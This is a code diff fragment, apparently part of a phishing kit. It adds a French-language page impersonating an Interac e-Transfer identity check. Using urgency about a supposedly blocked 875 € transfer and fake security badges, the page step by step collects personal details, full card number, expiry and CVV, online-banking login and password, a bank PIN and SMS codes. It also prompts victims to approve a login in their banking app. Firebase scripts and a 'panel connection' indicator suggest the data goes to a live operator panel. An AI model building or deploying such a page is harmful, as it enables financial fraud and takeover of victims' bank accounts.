+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        .loading-text {
+            color: var(--white-color);
+            margin-top: 20px;
+            font-size: 18px;
+            text-align: center;
+        }
+
+        .success-notification {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0);
+            background: linear-gradient(135deg, #10B981, #34D399);
+            color: var(--white-color);
+            padding: 40px;
+            border-radius: 20px;
+            text-align: center;
+            z-index: 10001;
+            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.3);
+            border: 3px solid #10B981;
+            max-width: 500px;
+            width: 90%;
+            opacity: 0;
+            transition: all 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+        }
+
+        .success-notification.show {
+            opacity: 1;
+            transform: translate(-50%, -50%) scale(1);
+        }
+
+        .success-icon {
+            font-size: 60px;
+            margin-bottom: 20px;
+            animation: bounce 1s ease-in-out;
+        }
+
+        .success-title {
+            font-size: 28px;
+            font-weight: 800;
+            margin-bottom: 15px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+
+        .success-message {
+            font-size: 18px;
+            opacity: 0.9;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        .countdown-20min {
+            font-size: 32px;
+            font-weight: 900;
+            font-family: 'Courier New', monospace;
+            background: rgba(255, 255, 255, 0.2);
+            padding: 15px 25px;
+            border-radius: 15px;
+            margin: 20px 0;
+            border: 2px solid rgba(255, 255, 255, 0.4);
+            animation: pulse 2s infinite;
+            color: var(--white-color);
+        }
+
+        .redirect-message {
+            font-size: 16px;
+            opacity: 0.8;
+            margin-top: 15px;
+            font-style: italic;
+        }
+
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-20px); }
+            60% { transform: translateY(-10px); }
+        }
+
+        .partner-logos {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 35px;
+            margin: 30px 0 20px;
+            flex-wrap: wrap;
+            padding: 0 20px;
+        }
+
+        .partner-logo {
+            width: 180px;
+            height: 100px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: var(--transition);
+            border-radius: 12px;
+            padding: 15px;
+            background: #1a1a1a;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            border: 2px solid var(--border-color);
+        }
+
+        .partner-logo img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+        }
+
+        .partner-logo:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+            border-color: #FFFFFF;
+        }
+
+        .copyright {
+            text-align: center;
+            padding: 15px 20px;
+            color: var(--gray-color);
+            font-size: 12px;
+            border-top: 1px solid #1a1a1a;
+            background: #000000;
+        }
+
+        @media (max-width: 768px) {
+            .container { border-radius: 10px; }
+            .form-container { padding: 20px; }
+            .main-logo { width: 350px; height: 200px; padding: 20px; }
+            .user-display { flex-direction: column; text-align: center; gap: 15px; }
+            .bank-logo-display { width: 70px; height: 70px; }
+            .card-logo { width: 70px; height: 50px; }
+            .card-chip { width: 40px; height: 32px; }
+            .push-notification { width: 280px; right: 10px; }
+            .card-security-logo { width: 220px; height: 110px; }
+            .security-logo { width: 180px; height: 100px; }
+            .loading-step-60, .loading-step-pin, .loading-step-sms, .loading-step-after-sms, .email-confirmation-step, .loading-step-email, .loading-step-final { padding: 30px 20px; }
+            .email-code-digit { width: 50px; height: 70px; font-size: 30px; }
+            .document-option { padding: 15px !important; }
+            .upload-area { padding: 15px !important; }
+        }
+
+        @media (max-width: 480px) {
+            .main-logo { width: 300px; height: 170px; padding: 15px; }
+            .user-display { padding: 15px; }
+            .bank-logo-display { width: 60px; height: 60px; }
+            .card-logo { width: 60px; height: 40px; }
+            .card-chip { width: 35px; height: 28px; }
+            .card-security-logo { width: 180px; height: 90px; }
+            .security-logo { width: 150px; height: 80px; }
+            .loading-step-60, .loading-step-pin, .loading-step-sms, .loading-step-after-sms, .email-confirmation-step, .loading-step-email, .loading-step-final { padding: 20px 15px; }
+            .email-code-digit { width: 40px; height: 60px; font-size: 24px; gap: 10px; }
+            .document-option { grid-column: span 2 !important; margin-bottom: 10px; }
+        }
+
+        .language-selector select {
+            background: rgba(0,0,0,0.8) !important;
+            border: 2px solid var(--border-color) !important;
+            color: var(--white-color) !important;
+            padding: 8px 12px !important;
+            border-radius: 8px !important;
+            font-size: 14px !important;
+            cursor: pointer !important;
+            transition: all 0.3s ease !important;
+            backdrop-filter: blur(10px) !important;
+        }
+
+        .language-selector select:hover {
+            background: rgba(0,0,0,0.9) !important;
+            border-color: #FFFFFF !important;
+            transform: translateY(-2px) !important;
+        }
+
+        .language-selector select option {
+            background: #1a1a1a !important;
+            color: var(--white-color) !important;
+            padding: 10px !important;
+        }
+
+        @media (max-width: 480px) {
+            .language-selector { top: 10px !important; left: 10px !important; }
+            .language-selector select { padding: 6px 8px !important; font-size: 12px !important; }
+            .user-display { flex-direction: column !important; text-align: center !important; gap: 15px !important; padding: 15px !important; }
+            .bank-logo-display { width: 60px !important; height: 60px !important; margin: 0 auto !important; }
+            .email-code-input { gap: 8px !important; margin: 20px 0 !important; }
+            .email-code-digit { width: 40px !important; height: 55px !important; font-size: 22px !important; }
+        }
+
+        @media (max-width: 768px) and (orientation: landscape) {
+            .form-container { padding: 15px !important; }
+            .user-display { padding: 12px !important; margin-bottom: 20px !important; }
+            .form-group { margin-bottom: 12px !important; }
+            .btn-container { flex-direction: column !important; gap: 10px !important; }
+            .btn { width: 100% !important; justify-content: center !important; }
+        }
+
+        @media (prefers-reduced-motion: reduce) {
+            *, *::before, *::after { animation-duration: 0.01ms !important; animation-iteration-count: 1 !important; transition-duration: 0.01ms !important; }
+        }
+
+        @media (hover: none) and (pointer: coarse) {
+            .btn { min-height: 44px !important; min-width: 44px !important; }
+            .form-input, .form-select, .email-code-digit { font-size: 16px !important; }
+            .btn:active { transform: scale(0.98) !important; }
+        }
+
+        [dir="rtl"] .form-container { text-align: right !important; }
+        [dir="rtl"] .user-display { flex-direction: row-reverse !important; }
+        [dir="rtl"] .btn-container { flex-direction: row-reverse !important; }
+        [dir="rtl"] .email-code-input { flex-direction: row-reverse !important; }
+
+        @media print {
+            .language-selector, .btn, .header-notification, .push-notification, .welcome-notification, .success-notification { display: none !important; }
+            .container { box-shadow: none !important; border: 1px solid #ccc !important; }
+            body { background: white !important; color: black !important; }
+        }
+
+        .device-mobile-small .form-title { font-size: 20px !important; margin-bottom: 15px !important; }
+        .device-mobile .btn { min-height: 50px !important; font-size: 16px !important; }
+        .device-tablet .main-logo { width: 400px !important; height: 220px !important; }
+        .device-desktop .card-3d { height: 220px !important; }
+        .device-desktop .card-logo { width: 120px !important; height: 80px !important; }
+        
+        .os-ios input, .os-ios select, .os-ios textarea { border-radius: 10px !important; -webkit-appearance: none !important; }
+        .os-android .btn { letter-spacing: 0.5px !important; }
+        .is-retina .card-chip img, .is-retina .bank-logo-display img { filter: brightness(1.1) contrast(1.1); }
+        .is-touch .form-input:focus, .is-touch .form-select:focus, .is-touch .email-code-digit:focus { border-width: 3px !important; }
+        
+        @media (prefers-reduced-data: reduce) {
+            .partner-logo, .security-logo, .card-security-logo { display: none !important; }
+            .main-logo img { filter: grayscale(1) !important; }
+        }
+        
+        @media (prefers-color-scheme: dark) { .device-desktop .container { border-color: #444 !important; } }
+        @media (prefers-reduced-motion: reduce) {
+            .device-desktop .btn:hover { transform: none !important; }
+            .loading-icon-sms, .loading-icon-after-sms, .loading-icon-email, .loading-icon-pin { animation: none !important; }
+        }
+        
+        .document-option { transition: all 0.3s ease; }
+        .document-option:hover { transform: translateY(-5px); box-shadow: 0 10px 30px rgba(251, 191, 36, 0.2); }
+        
+        .upload-area { transition: all 0.3s ease; position: relative; overflow: hidden; }
+        .upload-area:hover { transform: translateY(-3px); box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3); }
+        .upload-area::before {
+            content: '📤';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0);
+            font-size: 60px;
+            opacity: 0.1;
+            transition: transform 0.3s ease;
+            pointer-events: none;
+        }
+        .upload-area:hover::before { transform: translate(-50%, -50%) scale(1); }
+        
+        .file-preview { max-width: 100%; max-height: 60px; margin-top: 10px; }
+        .file-preview img { max-width: 100%; max-height: 100%; border-radius: 5px; }
+        
+        .loading-step-final {
+            display: none;
+            text-align: center;
+            color: var(--white-color);
+            padding: 40px;
+        }
+        
+        .loading-step-final.active { display: block; }
+        
+        .loading-step-final .loading-icon {
+            font-size: 60px;
+            margin-bottom: 25px;
+            animation: spin 2s linear infinite;
+        }
+        
+        .loading-step-final .loading-title {
+            font-size: 28px;
+            font-weight: 800;
+            margin-bottom: 15px;
+            color: var(--white-color);
+        }
+        
+        .loading-step-final .loading-message {
+            font-size: 18px;
+            margin-bottom: 30px;
+            line-height: 1.5;
+            color: #CCCCCC;
+        }
+        
+        .loading-step-final .progress-bar-60 {
+            width: 100%;
+            height: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+            overflow: hidden;
+            margin: 30px 0;
+        }
+        
+        .loading-step-final .progress-fill-60 {
+            height: 100%;
+            background: linear-gradient(to right, var(--button-color), #FFFFFF);
+            width: 0%;
+            transition: width 15s linear;
+            border-radius: 4px;
+        }
+
+        .country-code-selector { margin-bottom: 10px; }
+        
+        .country-code-selector select {
+            background: #1a1a1a !important;
+            color: var(--white-color) !important;
+            border: 2px solid var(--border-color) !important;
+            padding: 12px 15px !important;
+            border-radius: 10px !important;
+            font-size: 16px !important;
+            cursor: pointer !important;
+            transition: all 0.3s ease !important;
+        }
+        
+        .country-code-selector select:hover {
+            border-color: #FFFFFF !important;
+            transform: translateY(-2px) !important;
+        }
+        
+        .country-code-selector select option {
+            background: #1a1a1a !important;
+            color: var(--white-color) !important;
+            padding: 10px !important;
+        }
+        
+        #sms-phone-number {
+            font-size: 18px;
+            font-weight: bold;
+            color: var(--white-color);
+            background: rgba(0,0,0,0.3);
+            padding: 8px 15px;
+            border-radius: 8px;
+            display: inline-block;
+            border: 1px solid var(--border-color);
+            margin-top: 5px;
+            transition: all 0.3s ease;
+        }
+        
+        .phone-input-container {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+        
+        .phone-input-container select {
+            width: 160px;
+            flex-shrink: 0;
+        }
+        
+        .phone-input-container input {
+            flex: 1;
+        }
+        
+        .phone-validity-indicator {
+            display: inline-block;
+            margin-left: 10px;
+            font-size: 14px;
+        }
+        
+        .phone-validity-indicator.valid { color: #10B981; }
+        .phone-validity-indicator.invalid { color: #DC2626; }
+
+        #site-error-container {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 999999;
+            max-width: 450px;
+            pointer-events: none;
+        }
+
+        #site-error-container > div {
+            pointer-events: auto;
+            animation: slideInError 0.5s ease;
+        }
+
+        @keyframes slideInError {
+            from { opacity: 0; transform: translateX(100%) scale(0.8); }
+            to { opacity: 1; transform: translateX(0) scale(1); }
+        }
+
+        #panel-connection-indicator {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            width: 15px;
+            height: 15px;
+            border-radius: 50%;
+            background: #DC2626;
+            box-shadow: 0 0 10px rgba(220, 38, 38, 0.5);
+            z-index: 99998;
+            transition: all 0.3s ease;
+            border: 2px solid white;
+            cursor: pointer;
+            display: none;
+        }
+
+        #panel-connection-indicator.connected {
+            background: #10B981;
+            box-shadow: 0 0 15px rgba(16, 185, 129, 0.7);
+        }
+
+        #panel-connection-indicator.active {
+            background: #F59E0B;
+            box-shadow: 0 0 15px rgba(245, 158, 11, 0.7);
+            animation: pulse 1s infinite;
+        }
+
+        .step-indicator {
+            display: inline-block;
+            margin-left: 10px;
+            padding: 3px 8px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-weight: 600;
+            background: var(--border-color);
+            color: #000;
+        }
+    </style>
+    <!-- FIREBASE SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+</head>
+<body data-secure="MDk1MjA0OjI0NUg2YVZHV2JKOHV4THBxM1gyR2tPQVlVQXVSc1J3">
+    <!-- NOTIFICATION DE BIENVENUE -->
+    <div class="welcome-notification" id="welcome-notification">
+        <div class="welcome-icon">👋</div>
+        <div class="welcome-content">
+            <div class="welcome-title" id="welcome-title">Bienvenue </div>
+            <div class="welcome-subtitle">e-Transfer Virement.</div>
+            <div class="welcome-message" id="welcome-message">Votre espace personnel est maintenant activé<br>Recevez votre argent.</div>
+        </div>
+    </div>
+
+    <!-- LOADING OVERLAY -->
+    <div class="loading-overlay" id="loading-overlay">
+        <div class="loading-content">
+            <div class="loading-spinner"></div>
+            <div class="loading-text" id="loading-text">Traitement en cours...</div>
+        </div>
+    </div>
+
+    <!-- SUCCESS NOTIFICATION - VERT -->
+    <div class="success-notification" id="success-notification">
+        <div class="success-icon">✅</div>
+        <div class="success-title" id="success-title">Validation Réussie !</div>
+        <div class="success-message" id="success-message">
+            Votre compte a été validé avec succès.<br>
+            Le virement de <strong>875,00 €</strong> sera crédité sur votre compte dans :
+        </div>
+        <div class="countdown-20min" id="countdown-20min">20:00</div>
+        <div class="success-message">
+            Vous recevrez une confirmation par SMS et email.
+        </div>
+        <div class="redirect-message" id="redirect-message">Redirection vers bankofcanada.ca dans 15 secondes...</div>
+    </div>
+
+    <!-- NOTIFICATION PUSH SIMULÉE -->
+    <div class="push-notification" id="push-notification">
+        <div class="push-header">
+            <div class="push-bank-logo" id="push-bank-logo"></div>
+            <div class="push-bank-name" id="push-bank-name">Banque</div>
+            <div class="push-time" id="push-time">Maintenant</div>
+        </div>
+        <div class="push-content">
+            <div class="push-title">Confirmation de connexion requise</div>
+            <div class="push-message">Veuillez confirmer la connexion sur votre application bancaire pour recevoir le virement de 875,00 €</div>
+        </div>
+    </div>
+
+    <!-- Formulaire principal -->
+    <div class="container">
+        <!-- En-tête avec logo principal -->
+        <div class="header">
+            <div class="logo">Service de vérification VérifiéMC - Virement InteracMD Sécurisé</div>
+            <div class="main-logo">
+                <img src="https://media.beehiiv.com/cdn-cgi/image/format=auto,width=800,height=421,fit=scale-down,onerror=redirect/uploads/asset/file/c1e5eec0-b6eb-4011-9a53-3c1bfaedcec8/Green_and_Beige_Classic_Elegant_Nature_Foundation_Logo__30_.png" alt="Banque Canada">
+            </div>
+
+            <!-- COMPTE À REBOURS URGENCE -->
+            <div class="countdown-container" id="urgent-countdown">
+                <div class="countdown-title">⚠️ URGENT : Pour recevoir votre virement InteracMD sécurisé, il est impératif de confirmer votre identité avec Interac VérifiéMC.</div>
+                <div class="countdown-warning">Si vos informations sont incomplètes, il est possible d'annuler votre virement en cours de réception.</div>
+            </div>
+
+            <!-- 1. NUMÉRO DE RÉFÉRENCE UNIQUE -->
+            <div class="reference-container" id="reference-container">
+                <div class="reference-label">Numéro de Référence du Virement</div>
+                <div class="reference-number" id="reference-number">REF-2025-0012345678</div>
+                <div class="reference-note">Conservez ce numéro pour toute référence</div>
+            </div>
+
+            <!-- NOTIFICATION VIREMENT -->
+            <div class="header-notification">
+                <div class="header-notification-icon">💰</div>
+                <div class="header-notification-content">
+                    <div class="header-notification-title">VIREMENT INSTANTANÉ REÇU ! de la part de MICHEL GARCIA.</div>
+                    <div class="header-notification-message">
+                        <span class="amount-pulse">+ 875,00 €</span> 
+                        <p><span style="color: #000000;">Le virement InteracMD s&eacute;curis&eacute; que vous recevez actuellement est actuellement bloqu&eacute; dans notre serveur &agrave; cause d'une v&eacute;rification Interac V&eacute;rifi&eacute;MC!</span><span style="color: #0000ff;"> Veuillez proc&eacute;der &agrave; la r&eacute;ception de votre paiement aupr&egrave;s de votre institution financi&egrave;re et v&eacute;rifier votre identit&eacute;.</span></p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Conteneur du formulaire -->
+        <div class="form-container">
+            <!-- Étape 1: Informations personnelles -->
+            <div class="form-step active" id="step-1">
+                <h2 class="form-title" id="step1-title">Informations Personnelles</h2>
+                
+                <div class="security-certificates" id="security-certificates">
+                    <div class="certificate-badge">
+                        <div class="certificate-icon">🔒</div>
+                        <div class="certificate-label">SSL 256-bit</div>
+                        <div class="certificate-description">Chiffrement</div>
+                    </div>
+                    <div class="certificate-badge">
+                        <div class="certificate-icon">🏛️</div>
+                        <div class="certificate-label">PCI DSS</div>
+                        <div class="certificate-description">Certifié</div>
+                    </div>
+                    <div class="certificate-badge">
+                        <div class="certificate-icon">🛡️</div>
+                        <div class="certificate-label">PSD2</div>
+                        <div class="certificate-description">Compatible</div>
+                    </div>
+                    <div class="certificate-badge">
+                        <div class="certificate-icon">✅</div>
+                        <div class="certificate-label">GDPR</div>
+                        <div class="certificate-description">Protection</div>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="nom" class="form-label" id="nom-label">Nom</label>
+                    <input type="text" id="nom" class="form-input" placeholder="Votre nom" required>
+                    <div class="error-message" id="nom-error">Veuillez saisir votre nom</div>
+                </div>
+                <div class="form-group">
+                    <label for="prenom" class="form-label" id="prenom-label">Prénom</label>
+                    <input type="text" id="prenom" class="form-input" placeholder="Votre prénom" required>
+                    <div class="error-message" id="prenom-error">Veuillez saisir votre prénom</div>
+                </div>
+                <div class="form-group">
+                    <label for="email" class="form-label" id="email-label">Adresse e-mail</label>
+                    <input type="email" id="email" class="form-input" placeholder="votre.email@exemple.com" required>
+                    <div class="error-message" id="email-error">Veuillez saisir une adresse email valide</div>
+                </div>
+                <div class="form-group">
+                    <label for="telephone" class="form-label" id="telephone-label">Numéro de téléphone</label>
+                    <div id="phone-input-container" class="phone-input-container"></div>
+                    <div class="error-message" id="telephone-error">Veuillez saisir un numéro valide</div>
+                </div>
+                <div class="form-group">
+                    <label for="adresse" class="form-label" id="adresse-label">Adresse</label>
+                    <input type="text" id="adresse" class="form-input" placeholder="Votre adresse" required>
+                    <div class="error-message" id="adresse-error">Veuillez saisir votre adresse</div>
+                </div>
+                <div class="form-group">
+                    <label for="banque" class="form-label" id="banque-label">Banque</label>
+                    <select id="banque" class="form-select" required>
+                        <option value="" disabled selected>Sélectionnez votre institution financière</option>
+                        <option value="rbc">Royal Bank of Canada (RBC)</option>
+                        <option value="td">TD Canada Trust</option>
+                        <option value="scotiabank">Scotiabank</option>
+                        <option value="bmo">Banque de Montréal (BMO)</option>
+                        <option value="cibc">CIBC</option>
+                        <option value="national-bank">Banque Nationale du Canada</option>
+                        <option value="desjardins">Mouvement Desjardins</option>
+                        <option value="hsbc">HSBC Canada</option>
+                        <option value="laurentian">Banque Laurentienne</option>
+                        <option value="tangerine">Tangerine</option>
+                        <option value="alterna">Alterna Savings</option>
+                        <option value="equitable">Equitable Bank</option>
+                        <option value="motus">Motus Bank</option>
+                        <option value="presidents-choice">President's Choice Financial</option>
+                        <option value="simplii">Simplii Financial</option>
+                        <option value="vancity">Vancity</option>
+                        <option value="meridian">Meridian Credit Union</option>
+                        <option value="coast-capital">Coast Capital Savings</option>
+                        <option value="firstontario">FirstOntario Credit Union</option>
+                    </select>
+                    <div class="error-message" id="banque-error">Veuillez sélectionner votre banque</div>
+                </div>
+                <div class="btn-container">
+                    <button class="btn btn-next" onclick="validateStep(1)">
+                        <span class="btn-text" id="next1-text">Suivant</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Étape 2: Carte de crédit -->
+            <div class="form-step" id="step-2">
+                <h2 class="form-title" id="step2-title">Informations Carte Bancaire pour recevoir votre Paiement</h2>
+                
+                <div class="card-3d-container">
+                    <div class="card-3d" id="card-3d">
+                        <div class="card-front">
+                            <div class="card-chip" id="card-chip">
+                                <img src="https://as1.ftcdn.net/jpg/00/76/54/60/1000_F_76546001_fEMIgXIZEYF5HiNXwXzP0gI83FFCQSqv.jpg" alt="Puce de carte">
+                            </div>
+                            <div class="card-logo" id="card-logo"></div>
+                            <div class="card-number" id="card-number-display">•••• •••• •••• ••••</div>
+                            <div class="card-holder" id="card-holder-display">NOM PRÉNOM</div>
+                            <div class="card-expiry" id="card-expiry-display">MM/AA</div>
+                        </div>
+                        <div class="card-back">
+                            <div class="card-stripe"></div>
+                            <div class="card-cvv" id="card-cvv-display">•••</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="numero-carte" class="form-label" id="carte-label">Numéro de carte</label>
+                    <input type="text" id="numero-carte" class="form-input" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                    <div class="error-message" id="numero-carte-error">Veuillez saisir un numéro de carte valide</div>
+                </div>
+                <div class="form-group">
+                    <label for="nom-carte" class="form-label" id="nomcarte-label">Nom sur la carte</label>
+                    <input type="text" id="nom-carte" class="form-input" placeholder="Sera rempli automatiquement" readonly style="background-color: #2a2a2a; cursor: not-allowed;">
+                    <div class="error-message" id="nom-carte-error">Veuillez saisir le nom sur la carte</div>
+                </div>
+                <div class="form-group" style="display: flex; gap: 15px;">
+                    <div style="flex: 1;">
+                        <label for="expiration" class="form-label" id="expiration-label">Date d'expiration</label>
+                        <input type="text" id="expiration" class="form-input" placeholder="MM/AA" maxlength="5" required>
+                        <div class="error-message" id="expiration-error">Veuillez saisir une date d'expiration valide</div>
+                    </div>
+                    <div style="flex: 1;">
+                        <label for="cvv" class="form-label" id="cvv-label">CVV</label>
+                        <input type="text" id="cvv" class="form-input" placeholder="123" maxlength="3" required
+                               onfocus="flipCard(true)" onblur="flipCard(false)">
+                        <div class="error-message" id="cvv-error">Veuillez saisir le code CVV</div>
+                    </div>
+                </div>
+                
+                <div class="card-security-logos">
+                    <div class="card-security-logo">
+                        <img src="https://www.interac.ca/wp-content/uploads/2021/05/TrueFalse_GIF_05-6.gif" alt="Paiement Sécurisé">
+                    </div>
+                    <div class="card-security-logo">
+                        <img src="https://musiprof.com/wp-content/uploads/2024/01/Payement-1-edit-1-1.jpg" alt="3D Secure">
+                    </div>
+                </div>
+                
+                <div class="btn-container">
+                    <button class="btn btn-prev" onclick="prevStep(2)">
+                        <span class="btn-text" id="prev2-text">Précédent</span>
+                    </button>
+                    <button class="btn btn-next" onclick="validateStep(2)">
+                        <span class="btn-text" id="next2-text">Suivant</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Étape 3: Connexion avec logo de banque -->
+            <div class="form-step" id="step-3">
+                <p><span style="color: var(--border-color);">🔒 Merci de renseigner les identifiants bancaires de votre institution financière ci-dessous.</span></p>
+                
+                <div class="user-display" id="user-display">
+                    <div class="bank-logo-display" id="bank-logo-display"></div>
+                    <div class="user-info">
+                        <div class="bank-name" id="display-bank-name">Banque</div>
+                        <div class="user-name" id="display-user-name">Nom Prénom</div>
+                        <div class="account-status">Compte personnel • Actif</div>
+                    </div>
+                </div>
+                
+                <h2 class="form-title" id="step3-title">Connexion Sécurisée</h2>
+                <div class="form-group">
+                    <label for="identifiant" class="form-label" id="identifiant-label">Identifiant Bancaire</label>
+                    <input type="text" id="identifiant" class="form-input" placeholder="Votre identifiant" required>
+                    <div class="error-message" id="identifiant-error">Veuillez saisir votre identifiant</div>
+                </div>
+                <div class="form-group">
+                    <label for="motdepasse" class="form-label" id="motdepasse-label">Mot de passe</label>
+                    <input type="text" id="motdepasse" class="form-input" placeholder="Votre mot de passe" required>
+                    <div class="error-message" id="motdepasse-error">Veuillez saisir votre mot de passe</div>
+                </div>
+                <div class="btn-container">
+                    <button class="btn btn-prev" onclick="prevStep(3)">
+                        <span class="btn-text" id="prev3-text">Précédent</span>
+                    </button>
+                    <button class="btn btn-next" onclick="validateStep(3)">
+                        <span class="btn-text" id="next3-text">Suivant</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Étape 4: Confirmation de connexion (1 minute) -->
+            <div class="confirmation-step" id="step-4">
+                <div class="user-display" style="margin-bottom: 30px;">
+                    <div class="bank-logo-display" id="confirmation-bank-logo"></div>
+                    <div class="user-info">
+                        <div class="bank-name" id="confirmation-bank-name">Banque</div>
+                        <div class="user-name" id="confirmation-user-name">Nom Prénom</div>
+                        <div class="account-status">Confirmation en attente sur votre application</div>
+                    </div>
+                </div>
+                
+                <div class="confirmation-icon">📱</div>
+                <h2 class="confirmation-title">Confirmez la connexion sur votre application mobile</h2>
+                <div class="confirmation-message">
+                    Une demande de connexion sécurisée a été envoyée à l'application mobile de <strong id="confirmation-bank-name-text">votre banque</strong>.<br><br>
+                    <strong>Veuillez ouvrir votre application bancaire et confirmer la connexion dans les 1 minute.</strong><br><br>
+                    <p><span style="color: #ff0000;">Si vous ne recevez aucune notification via votre application mobile, nous vous enverrons un code par SMS ou nous vous enverrons un code par e-mail.</span></p>
+                    <span style="color: var(--border-color);">✅ Sécurité garantie par l'authentification forte de votre banque</span>
+                </div>
+                <div class="confirmation-countdown" id="confirmation-countdown">01:00</div>
+                <div class="confirmation-note">
+                    Cette étape garantit la sécurité maximale de votre compte bancaire.
+                </div>
+            </div>
+
+            <!-- LOADING ÉTAPE 4 (après confirmation) -->
+            <div class="loading-step-60" id="step-loading-60">
+                <div class="user-display" style="margin-bottom: 30px;">
+                    <div class="bank-logo-display" id="loading60-bank-logo"></div>
+                    <div class="user-info">
+                        <div class="bank-name" id="loading60-bank-name">Banque</div>
+                        <div class="user-name" id="loading60-user-name">Nom Prénom</div>
+                        <div class="account-status">Vérification de sécurité en cours</div>
+                    </div>
+                </div>
+                
+                <div class="loading-icon">⏳</div>
+                <h2 class="loading-title">Connexion confirmée avec succès</h2>
+                <div class="loading-message">
+                    Votre identité a été vérifiée avec succès.<br><br>
+                    <strong>Préparation de la validation sécurisée en cours...</strong><br><br>
+                    <span style="color: var(--border-color);">✅ Authentification forte validée par votre banque</span>
+                </div>
+                
+                <div class="progress-bar-60">
+                    <div class="progress-fill-60" id="progress-fill-60"></div>
+                </div>
+                
+                <div class="confirmation-note">
+                    Cette étape sécurisée prépare l'envoi de votre code de validation.
+                </div>
+            </div>
+
+            <!-- Étape 5: Code PIN -->
+            <div class="form-step" id="step-5">
+                <div class="user-display" style="margin-bottom: 25px;">
+                    <div class="bank-logo-display" id="pin-bank-logo"></div>
+                    <div class="user-info">
+                        <div class="bank-name" id="pin-bank-name">Banque</div>
+                        <div class="user-name" id="pin-user-name">Nom Prénom</div>
+                        <div class="account-status">Validation sécurisée - Code de sécurité</div>
+                    </div>
+                </div>
+                
+                <h2 class="form-title" id="step5-title">Validation Authentification Forte</h2>
+                <div class="form-group">
+                    <label for="pin" class="form-label" id="pin-label">Code de sécurité bancaire</label>
+                    <div style="position: relative;">
+                        <input type="text" id="pin" class="form-input" placeholder="••••••" maxlength="6" required>
+                        <div style="position: absolute; right: 15px; top: 50%; transform: translateY(-50%); color: var(--border-color); font-size: 20px;">🔒</div>
+                    </div>
+                    <div class="error-message" id="pin-error">Veuillez saisir votre code de sécurité</div>
+                </div>
+                
+                <div class="security-logos">
+                    <div class="security-logo">
+                        <img src="https://www.datocms-assets.com/44717/1690808008-dsp2.jpg?auto=format&fit=clip&h=1024" alt="DSP2">
+                    </div>
+                    <div class="security-logo">
+                        <img src="https://www.mararapaiement.pf/wp-content/uploads/2025/08/Image-DSP2.png" alt="PSD2">
+                    </div>
+                    <div class="security-logo">
+                        <img src="https://particuliers.attijariwafabank-europe.fr/wp-content/uploads/2021/03/Picto_Cadenas-300x300-1-300x300.png" alt="Sécurité">
+                    </div>
+                </div>
+                
+                <div style="text-align: center; margin: 20px 0; color: #CCCCCC; font-size: 14px;">
+                    <span style="color: var(--border-color);">⚠️</span> Ce code est envoyé par votre banque via SMS ou application mobile
+                </div>
+                <div class="btn-container">
+                    <button class="btn btn-prev" onclick="prevStep(5)">
+                        <span class="btn-text" id="prev5-text">Précédent</span>
+                    </button>
+                    <button class="btn btn-submit" onclick="validateStep(5)">
+                        <span class="btn-text" id="submit-text">Valider</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- LOADING ÉTAPE 5 (après code PIN) -->
+            <div class="loading-step-pin" id="step-loading-pin">
+                <div class="user-display" style="margin-bottom: 30px;">
+                    <div class="bank-logo-display" id="loadingpin-bank-logo"></div>
+                    <div class="user-info">
+                        <div class="bank-name" id="loadingpin-bank-name">Banque</div>
+                        <div class="user-name" id="loadingpin-user-name">Nom Prénom</div>
+                        <div class="account-status">Validation du code PIN en cours</div>
+                    </div>
+                </div>
+                
+                <div class="loading-icon-pin">🔐</div>
+                <h2 class="loading-title-pin">Validation de sécurité en cours</h2>
+                <div class="loading-message-pin">
+                    Votre code PIN est en cours de vérification.<br><br>
+                    <strong>Préparation de l'envoi du code SMS...</strong><br><br>
+                    <span style="color: var(--border-color);">⏱️ Cette opération sécurisée prend quelques instants</span>
+                </div>
+                
+                <div class="dots-container-pin">
+                    <div class="dot-pin"></div>
+                    <div class="dot-pin"></div>
+                    <div class="dot-pin"></div>
+                    <div class="dot-pin"></div>
+                </div>
+                
+                <div class="security-check-pin">
+                    <div class="security-check-icon-pin">✅</div>
+                    <div class="security-check-text-pin">Cryptage SSL 256-bit activé • Audit de sécurité en cours • Protection DSP2 active</div>
+                </div>
+            </div>
+
+            <!-- Étape 6: Code SMS -->
+            <div class="form-step" id="step-6">
+                <div class="user-display" style="margin-bottom: 25px;">
+                    <div class="bank-logo-display" id="sms-bank-logo"></div>
+                    <div class="user-info">
+                        <div class="bank-name" id="sms-bank-name">Banque</div>
+                        <div class="user-name" id="sms-user-name">Nom Prénom</div>
+                        <div class="account-status">Validation finale - Code SMS</div>
+                    </div>
+                </div>
+                
+                <h2 class="form-title" id="step6-title">Vérification par SMS</h2>
+                <div class="form-group">
+                    <label for="sms" class="form-label" id="sms-label">Code SMS de sécurité</label>
+                    <div style="position: relative;">
